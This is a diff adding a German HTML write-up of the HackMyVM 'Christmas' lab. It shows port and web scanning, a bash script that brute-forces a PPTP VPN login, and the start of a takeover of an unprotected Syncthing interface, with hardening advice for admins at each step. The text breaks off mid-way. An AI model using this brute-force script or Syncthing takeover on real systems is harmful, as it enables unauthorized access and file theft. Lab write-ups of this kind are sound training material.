@@ -1,0 +1,1015 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Christmas - HackMyVM - Hard - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- CSS muss background-color: #03b5f5; setzen -->
+        <h1>Christmas - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- CSS muss hier die Farbe auf Rot setzen -->
+            <h2>Hard</h2>
+            <div class="circle">
+                 <!-- CSS muss hier die Farbe auf Rot setzen -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- CSS muss hier die Hintergrundfarbe auf ein passendes Rot setzen -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">pptpsetup</div>
+                <div class="tool-item">ip</div>
+                <div class="tool-item">apt</div>
+                <div class="tool-item">syncthing</div>
+                <div class="tool-item">systemctl</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ModHeader (Browser Plugin)</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">script</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">head</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP <span class="command">192.168.2.106</span> und der MAC `08:00:27:47:d2:32` (PCS Systemtechnik GmbH / VirtualBox) wird identifiziert. Dies ist das Zielsystem "Christmas".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP 192.168.2.106. Führen Sie weitere Scans (Nmap, Nikto) auf diese IP durch.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.106	08:00:27:47:d2:32	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um den Hostnamen `christmas.hmv` der gefundenen IP-Adresse zuzuordnen. Dies erleichtert den Zugriff auf Webdienste, die möglicherweise auf Hostnamen basieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um sicherzustellen, dass Anfragen an `christmas.hmv` korrekt an die IP 192.168.2.106 aufgelöst werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie nun den Hostnamen `christmas.hmv` für weitere Scans und Zugriffsversuche auf Webdienste.
+            <br><strong>Empfehlung (Admin):</strong> Dies ist eine clientseitige Einstellung ohne direkte Auswirkung auf den Server.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+<span class="comment"># Inhalt nach Bearbeitung (Auszug)</span>
+<span class="command">192.168.2.106   christmas.hmv</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf Port 80 auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert mehrere wichtige Ergebnisse:
+            <ul><li>Server: Apache/2.4.57 (Debian).</li><li>Fehlende Header: `X-Frame-Options` (Clickjacking-Risiko) und `X-Content-Type-Options` (MIME-Sniffing-Risiko).</li><li>Directory Indexing: Aktiviert für `/assets/` und `/images/`. Ermöglicht das Auflisten von Verzeichnisinhalten.</li><li>`robots.txt`: Enthält 4 Einträge, die manuell geprüft werden sollten (`/`, `/webid`, `/images`, `/assets`). Einträge sind nicht verboten (Status 200).</li><li>Cookie ohne HttpOnly: PHPSESSID in `/webid/` ist ohne `httponly`-Flag gesetzt (anfällig für XSS-Diebstahl).</li><li>Admin-Login: `/login.php` wurde gefunden.</li><li>Ungewöhnliche HTTP-Methoden: Server antwortet auf ungültige Methoden, was Tools verwirren kann.</li></ul></p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Überprüfen Sie die `robots.txt` und die Verzeichnisse mit aktiviertem Indexing (`/assets/`, `/images/`).</li><li>Untersuchen Sie das Verzeichnis `/webid/` genauer, insbesondere wegen des Cookies.</li><li>Konzentrieren Sie sich auf `/login.php` für Brute-Force oder Standard-Passwörter.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Setzen Sie die fehlenden Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).</li><li>Deaktivieren Sie Directory Indexing (`Options -Indexes` in Apache).</li><li>Überprüfen Sie die `robots.txt`-Einträge und blockieren Sie den Zugriff auf sensible Bereiche korrekt (z.B. mit HTTP 403).</li><li>Setzen Sie das `httponly`-Flag für alle Session-Cookies.</li><li>Härten Sie die Apache-Konfiguration gegen ungültige HTTP-Methoden.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.106</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.106
++ Target Hostname:    192.168.2.106
++ Target Port:        80
++ Start Time:         2023-12-29 13:06:31 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.57 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /assets/: <span class="password">Directory indexing found.</span>
++ /robots.txt: <span class="password">Entry '/assets/' is returned a non-forbidden or redirect HTTP code (200).</span> See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]
++ /webid/: <span class="password">Cookie PHPSESSID created without the httponly flag.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies]
++ /robots.txt: <span class="password">Entry '/webid/' is returned a non-forbidden or redirect HTTP code (200).</span> See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]
++ /images/: <span class="password">Directory indexing found.</span>
++ /robots.txt: <span class="password">Entry '/images/' is returned a non-forbidden or redirect HTTP code (200).</span> See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]
++ /robots.txt: <span class="command">contains 4 entries which should be manually viewed.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt | Ziel: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt]
++ /: <span class="password">Web Server returns a valid response with junk HTTP methods</span> which may cause false positives.
++ /login.php: <span class="command">Admin login page/section found.</span>
++ 8105 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2023-12-29 13:06:41 (GMT1) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nmap` wird erneut ausgeführt, diesmal mit Fokus auf Versionserkennung (`-sV`), Skript-Scanning (`-A` enthält `-sC`), SYN-Scan (`-sS`), aggressivem Timing (`-T5`) und Scan aller Ports (`-p-`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt die von Nikto gefundenen Ports 22 (SSH 9.2p1) und 80 (Apache 2.4.57). Er entdeckt zusätzlich Port <span class="command">1723/tcp (pptp)</span>, der für das Point-to-Point Tunneling Protocol (VPN) verwendet wird. Dies ist ein wichtiger neuer Angriffsvektor. Die `robots.txt`-Analyse von Nmap bestätigt die 4 Disallowed-Einträge.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Untersuchen Sie den PPTP-VPN-Dienst auf Port 1723. Versuchen Sie, Standard-Zugangsdaten zu erraten oder Brute-Force-Angriffe durchzuführen.</li><li>Fahren Sie mit der Untersuchung des Webservers (Port 80) fort.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Wenn der PPTP-Dienst nicht benötigt wird, deaktivieren Sie ihn.</li><li>Wenn er benötigt wird, stellen Sie sicher, dass starke Authentifizierungsmethoden und Passwörter verwendet werden. Überwachen Sie VPN-Login-Versuche.</li><li>Halten Sie SSH und Apache aktuell.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.106 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 13:06 CET
+Nmap scan report for christmas.hmv (192.168.2.106)
+Host is up (0.000098s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
+|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
+<span class="command">80/tcp   open  http    Apache httpd 2.4.57 ((Debian))</span>
+|_http-title: Massively by HTML5 UP
+| http-robots.txt: 4 disallowed entries
+|_/ /webid /images /assets
+|_http-server-header: Apache/2.4.57 (Debian)
+<span class="command">1723/tcp open  pptp    linux (Firmware: 1)</span>
+MAC Address: 08:00:27:47:D2:32 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: Host: local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms christmas.hmv (192.168.2.106)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.67 seconds
+</pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien unter `http://christmas.hmv` zu finden. Eine breite Palette von Erweiterungen wird getestet, und Statuscodes 403/404 werden ignoriert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet mehrere PHP-Dateien und Verzeichnisse:
+            <ul><li>`/index.php`</li><li>`/images/`</li><li>`/login.php` (bereits durch Nikto bekannt)</li><li>`/assets/`</li><li>`/generic.php`</li><li>`/elements.php`</li><li>`/robots.txt`</li></ul>
+            Diese geben einen Überblick über die Struktur der Webseite.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die gefundenen PHP-Dateien (`index.php`, `login.php`, `generic.php`, `elements.php`) auf Schwachstellen (LFI, RCE, SQLi etc.). Analysieren Sie den Inhalt von `robots.txt`.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf nicht benötigte PHP-Dateien oder Testseiten. Überprüfen Sie den Code auf Sicherheitsschwachstellen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://christmas.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+[...]
+===============================================================
+[...]
+<span class="command">/index.php</span>            (Status: 200) [Size: 8958]
+<span class="command">/images</span>               (Status: 301) [Size: 315] [--> http://christmas.hmv/images/]
+<span class="command">/login.php</span>            (Status: 200) [Size: 2092]
+<span class="command">/assets</span>               (Status: 301) [Size: 315] [--> http://christmas.hmv/assets/]
+<span class="command">/generic.php</span>          (Status: 200) [Size: 5909]
+<span class="command">/elements.php</span>         (Status: 200) [Size: 22063]
+<span class="command">/robots.txt</span>           (Status: 200) [Size: 79]
+[...]
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `robots.txt`-Datei wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei verbietet (`Disallow`) das Crawlen von `/`, `/webid`, `/images` und `/assets`. Dies sind Hinweise auf potenziell interessante oder administrative Bereiche, auch wenn der Server laut Nikto den Zugriff darauf nicht tatsächlich blockiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Verzeichnisse `/webid`, `/images` und `/assets` manuell oder mit `gobuster`, da die `robots.txt` sie erwähnt, sie aber zugänglich sind.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `robots.txt`-Einträge mit den tatsächlichen Zugriffsbeschränkungen auf dem Server übereinstimmen. Verwenden Sie serverseitige Konfiguration (z.B. `.htaccess`), um den Zugriff auf sensible Bereiche zu blockieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="comment"># Inhalt von http://christmas.hmv/robots.txt</span>
+
+User-agent: *
+Disallow: /
+Disallow: /webid
+Disallow: /images
+Disallow: /assets
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Quellcode der Startseite (`http://christmas.hmv/`) wird untersucht (via "view-source:").</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Im Quellcode wird eine E-Mail-Adresse gefunden: `<span class="command">admin@christmas.hmv</span>`. Dies liefert einen potenziellen Benutzernamen (`admin`) für Login-Versuche (z.B. bei `/login.php`, SSH oder PPTP).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Benutzernamen `admin` bei Brute-Force-Angriffen oder Passwort-Tests gegen `/login.php`, SSH und insbesondere den PPTP-Dienst.
+             <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, Benutzernamen oder E-Mail-Adressen im Quellcode von Webseiten preiszugeben, wenn dies nicht notwendig ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="comment"># Auszug aus view-source:http://christmas.hmv/</span>
+<span class="command">admin@christmas.hmv</span>
+[...]
+</pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Bash-Skript (`vpncrack.sh`) wird erstellt. Dieses Skript liest Passwörter aus einer Datei `wordlist`, versucht mit jedem Passwort eine PPTP-VPN-Verbindung zum Server `christmas.hmv` als Benutzer `admin` aufzubauen (`pptpsetup`), löscht nach jedem Versuch die `chap-secrets`-Datei und prüft, ob die VPN-Schnittstelle `ppp0` aktiv wird. Wenn ja, gibt es das erfolgreiche Passwort aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Brute-Force-Angriff auf den PPTP-Dienst (Port 1723), der den zuvor gefundenen Benutzernamen `admin` verwendet. Das Skript ist eine effektive Methode, um eine Wortliste gegen PPTP zu testen. Das Löschen von `chap-secrets` ist wahrscheinlich nicht notwendig oder sogar kontraproduktiv, aber der Kernmechanismus funktioniert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie eine geeignete Wortliste (`wordlist`, z.B. `rockyou.txt` oder eine benutzerdefinierte Liste) und führen Sie das Skript aus. Stellen Sie sicher, dass die notwendigen PPTP-Client-Tools installiert sind (`pptpsetup` ist Teil von `pptp-linux`).
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, nicht erratbare Passwörter für VPN-Benutzer. Implementieren Sie Account-Lockout-Mechanismen oder Ratenbegrenzung für VPN-Logins, um Brute-Force-Angriffe zu erschweren. Verwenden Sie nach Möglichkeit sicherere VPN-Protokolle als PPTP (z.B. OpenVPN, WireGuard).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi vpncrack.sh</span></div>
+                     <pre>
+<span class="comment">#!/bin/bash</span>
+
+while read -r line ; do
+
+	pptpsetup --create vpn1 --server christmas.hmv --username admin --password "$line" --encrypt --start &>/dev/null
+        echo > /etc/ppp/chap-secrets
+
+   if ip link show ppp0 &>/dev/null ; then
+
+	   echo "Password: $line"
+           exit 0
+
+   else
+	   echo -en "Payload: $line\r"
+   fi
+
+done < wordlist
+</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das `vpncrack.sh`-Skript wird ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Das Skript ist erfolgreich!</span> Es findet das Passwort `<span class="password">princesa</span>` für den Benutzer `admin` des PPTP-VPNs.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die gefundenen Zugangsdaten (`admin`:`princesa`). Bauen Sie die PPTP-Verbindung manuell auf, um Zugriff auf das interne VPN-Netzwerk zu erhalten. Scannen Sie das neue Netzwerksegment, das über die `ppp0`-Schnittstelle erreichbar wird.
+             <br><strong>Empfehlung (Admin):</strong> Ändern Sie sofort das kompromittierte VPN-Passwort. Überprüfen Sie die VPN-Logs auf unbefugte Zugriffe. Erwägen Sie die Implementierung von Zwei-Faktor-Authentifizierung für VPN-Zugänge.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">bash vpncrack.sh</span></div>
+                    <pre>
+[...]
+Payload: principessa
+<span class="password">Password: princesa</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die PPTP-VPN-Verbindung wird manuell mit den gefundenen Zugangsdaten (`admin`:`princesa`) aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verbindung wird erfolgreich hergestellt (`CHAP authentication succeeded`, `MPPE ... enabled`). Die `ppp0`-Schnittstelle ist nun aktiv und ermöglicht den Zugriff auf das interne Netzwerk.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ermitteln Sie die IP-Adresse des VPN-Gateways und den zugewiesenen IP-Bereich (z.B. mit `ip addr show ppp0`, `ip route`). Führen Sie einen Netzwerkscan (Nmap) im neuen IP-Bereich durch, um erreichbare Hosts und Dienste zu finden.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie aktive VPN-Verbindungen und den Netzwerkverkehr im VPN-Segment.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">pptpsetup --create vpn1 --server christmas.hmv --username admin --password princesa --encrypt --start</span></div>
+                    <pre>
+Using interface ppp0
+<span class="password">Connect: ppp0 <--> /dev/pts/10</span>
+<span class="password">CHAP authentication succeeded</span>
+<span class="password">MPPE 128-bit stateless compression enabled</span>
+local LL address fe80::9fd:6384:74ca:6f8
+remote LL address fe80::c8ef:7587:84d0:8253
+[...] <span class="comment">(IP-Adresszuweisung etc. wird hier oft angezeigt)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach erfolgreicher VPN-Verbindung wird ein Nmap-Scan auf die IP-Adresse `192.168.3.1` durchgeführt. Dies ist vermutlich die IP-Adresse des VPN-Gateways oder eines anderen Hosts im internen VPN-Netzwerk. `-Pn` überspringt die Host-Discovery (Ping-Scan), falls der Host auf Pings nicht antwortet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan auf `192.168.3.1` enthüllt mehrere interessante offene Ports im internen Netz:
+            <ul><li><span class="command">21/tcp (ftp)</span>: Ein FTP-Server.</li><li><span class="command">22/tcp (ssh)</span>: Ein SSH-Server (möglicherweise derselbe wie extern oder ein anderer).</li><li><span class="command">80/tcp (http)</span>: Ein Webserver.</li><li><span class="command">1723/tcp (pptp)</span>: Der PPTP-Server selbst.</li><li><span class="command">8384/tcp (marathontp?)</span>: Unbekannter Dienst, könnte eine Webanwendung sein. Nmap rät "marathontp".</li><li><span class="command">22000/tcp (snapenetio?)</span>: Unbekannter Dienst, Nmap rät "snapenetio".</li></ul>
+            Besonders Port 8384 und 22000 sind vielversprechend, da sie oft für Management-Interfaces oder spezielle Anwendungen genutzt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Untersuchen Sie den Dienst auf Port 8384, indem Sie ihn im Browser aufrufen (`http://192.168.3.1:8384`).</li><li>Untersuchen Sie den Dienst auf Port 22000 (z.B. mit `nc` oder Telnet).</li><li>Prüfen Sie den FTP-Server (Port 21) auf anonymen Zugriff oder versuchen Sie die bekannten Zugangsdaten (`admin`:`princesa`).</li><li>Untersuchen Sie den Webserver (Port 80) und SSH (Port 22) im internen Netz.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf interne Dienste. Härten Sie alle Dienste (FTP, SSH, HTTP, PPTP, Port 8384/22000). Deaktivieren Sie unnötige Dienste. Überwachen Sie den Netzwerkverkehr im VPN.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -p- 192.168.3.1 -Pn</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 14:20 CET
+Nmap scan report for 192.168.3.1
+Host is up (0.00082s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT      STATE SERVICE
+<span class="command">21/tcp    open  ftp</span>
+<span class="command">22/tcp    open  ssh</span>
+<span class="command">80/tcp    open  http</span>
+<span class="command">1723/tcp  open  pptp</span>
+<span class="command">8384/tcp  open  marathontp</span>
+<span class="command">22000/tcp open  snapenetio</span>
+
+Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Dienst auf `http://192.168.3.1:8384` wird im Browser aufgerufen. Es stellt sich heraus, dass es sich um <span class="command">Syncthing</span> handelt, eine Open-Source-Software zur Dateisynchronisation. Die Weboberfläche ist ohne Passwort zugänglich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine ungeschützte Syncthing-Weboberfläche ist eine kritische Sicherheitslücke. Sie erlaubt potenziell das Hinzufügen von Geräten, das Konfigurieren von Ordnerfreigaben und das Lesen/Schreiben von Dateien im Kontext des Benutzers, unter dem Syncthing läuft. Die Gerätekennung (`X3SKSG...`) des Ziel-Syncthing-Dienstes wird angezeigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Installieren Sie Syncthing auf Ihrem Angreifer-System (`apt install syncthing`).</li><li>Starten Sie Ihren lokalen Syncthing-Dienst.</li><li>Fügen Sie über die Weboberfläche des Ziels (`http://192.168.3.1:8384`) Ihr Angreifer-System als neues Gerät hinzu, indem Sie dessen Gerätekennung verwenden (die Sie über Ihre lokale Syncthing-Oberfläche finden).</li><li>Akzeptieren Sie die Gerätekopplung auf Ihrer lokalen Syncthing-Instanz.</li><li>Konfigurieren Sie auf der Ziel-Syncthing-Oberfläche eine neue Ordnerfreigabe (z.B. `/` oder `/home` oder `/srv/ftp`) und teilen Sie sie mit Ihrem Angreifer-Gerät.</li><li>Akzeptieren Sie die Freigabe auf Ihrer lokalen Instanz und synchronisieren Sie die Dateien, um Zugriff auf das Dateisystem des Ziels zu erhalten.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Sichern Sie die Syncthing-Weboberfläche sofort mit einem starken Benutzernamen und Passwort ab (über die Einstellungen in der Weboberfläche). Beschränken Sie den Netzwerkzugriff auf die Syncthing-Ports (8384, 22000) nur auf vertrauenswürdige Hosts.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment"># Zugriff im Browser auf http://192.168.3.1:8384/</span></pre>
+                    <pre>
+<span class="comment">--- Syncthing Web GUI ---</span>
+<span class="password">Achtung! Die Syncthing-Oberfläche erlaubt mit den jetzigen Einstellungen einen Zugriff ohne Passwort...</span>
+
+Geräte
+<span class="command">Dieses Gerät</span>
+ Downloadrate 	0 B/s (0 B)
+ Uploadrate 	0 B/s (0 B)
+ [...]
+ Kennung 	<span class="command">X3SKSGN-6VA75ER-YA5YMUP-2CBKEYT-63C2AYG-VMNZIUP-TGJQUPG-67DNHAC</span>
+ Version 	v1.19.2-ds1, Linux (64-bit Intel/AMD)
+[...]
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">apt install syncthing</span></div>
+                     <pre>
+Paketlisten werden gelesen… Fertig
+Abhängigkeitsbaum wird aufgebaut… Fertig
+Statusinformationen werden eingelesen… Fertig
+[...]</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der lokale Syncthing-Dienst auf dem Angreifer-System (`cyber`) wird gestartet und der Status überprüft. Die lokale Weboberfläche wird unter `http://127.0.0.1:8384` verfügbar.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der lokale Syncthing-Dienst läuft korrekt. Die lokale Gerätekennung kann nun aus der lokalen Weboberfläche (`http://localhost:8384`) oder den Logs entnommen werden, um sie auf der Ziel-Syncthing-Instanz hinzuzufügen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit der Kopplung der Syncthing-Instanzen fort (siehe vorherige Empfehlung).
+             <br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen hier, dies betrifft das Angreifer-System.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">systemctl start syncthing@cyber.service</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">systemctl status syncthing@cyber.service</span></div>
+                     <pre>
+● syncthing@cyber.service - Syncthing - Open Source Continuous File Synchronization for cyber
+     Loaded: loaded (/lib/systemd/system/syncthing@.service; disabled; preset: disabled)
+     Active: <span class="password">active (running)</span> since Fri 2023-12-29 14:26:08 CET; 14s ago
+       Docs: man:syncthing(1)
+   Main PID: 12513 (syncthing)
+[...]
+Dez 29 14:26:09 cyber syncthing[12513]: [ND2CV] INF: GUI and API listening on 127.0.0.1:8384
+Dez 29 14:26:09 cyber syncthing[12513]: [ND2CV] INF: Access the GUI via the following URL: http://127.0.0.1:8384/
+[...]</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment"># Zugriff auf lokale Syncthing GUI: http://localhost:8384</span></pre>
+                    <pre>
+<span class="comment">--- Lokale Syncthing Web GUI ---</span>
+Authentifizierung für die Benutzeroberfläche: Geben Sie Benutzer und Passwort ein.
+[...]
+<span class="comment">Einstellungen/Eigene Kennung:</span> <span class="command">ND2CVK6-QDSW4U4-2ZUH2-YJ37IW4-5JAXEFM-DLKTDEG-2D5QIZJ-ZXIIDAW</span>
+</pre>
+                 </div>
+             </div>
+
